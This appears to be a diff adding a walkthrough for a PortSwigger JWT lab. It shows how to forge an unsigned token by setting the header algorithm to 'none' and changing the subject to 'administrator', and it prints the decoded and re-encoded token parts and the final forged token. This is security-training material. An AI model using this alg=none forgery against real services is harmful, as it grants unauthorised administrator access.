@@ -1,0 +1,26 @@
+The steps below are meant to solve the following lab:
+https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification
+
+
+JWT Token without signature:
+eyJraWQiOiIzMDFjMTQwMS1mODhhLTRhZDMtYjU3OC01Y2M4ZThkOTgwMGUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4OTcwOTA4Mn0.
+
+JWT Token without signature after decoding from Base 64:
+{"kid":"301c1401-f88a-4ad3-b578-5cc8e8d9800e","alg":"RS256"}{"iss":"portswigger","sub":"wiener","exp":1689709082}
+
+Just the header from the JWT Token after decoding from Base 64 and replacing the algorithm type to none:
+{"kid":"301c1401-f88a-4ad3-b578-5cc8e8d9800e","alg":"none"}
+
+JWT token header above after Base 64 encoding:
+eyJraWQiOiIzMDFjMTQwMS1mODhhLTRhZDMtYjU3OC01Y2M4ZThkOTgwMGUiLCJhbGciOiJub25lIn0=
+
+JWT token payload after changing sub value to administrator:
+{"iss":"portswigger","sub":"administrator","exp":1689709082}
+
+JWT token payload above after Base 64 encoding:
+eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODk3MDkwODJ9
+
+Putting the two together to form new JWT token:
+eyJraWQiOiIzMDFjMTQwMS1mODhhLTRhZDMtYjU3OC01Y2M4ZThkOTgwMGUiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODk3MDkwODJ9.
+
+After all this the admin panel should become accessible.
